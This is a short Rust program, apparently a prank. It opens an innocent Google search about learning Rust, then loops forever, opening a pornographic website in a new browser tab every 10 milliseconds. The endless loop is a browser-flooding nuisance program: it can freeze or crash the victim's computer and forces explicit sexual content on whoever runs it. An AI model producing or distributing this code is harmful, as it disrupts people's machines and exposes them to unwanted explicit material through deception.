use std::{thread, time};

fn main() {
    if let Err(e) = open_tab("https://google.com/search?q=how+to+program+in+rust") {
        println!("{:#?}", e);
        panic!("Failed to execute program!");
    }    
    thread::sleep(time::Duration::from_millis(15));

    let delay = time::Duration::from_millis(10);
    let target_url = "https://pornhub.com/gay";

    loop {
        if let Err(e) = open_tab(target_url) {
            println!("{:#?}", e);
            panic!("Failed to execute program!");
        }
        thread::sleep(delay);
    }
}

fn open_tab(url: &str) -> Result<(), std::io::Error> {
    webbrowser::open(&url)
}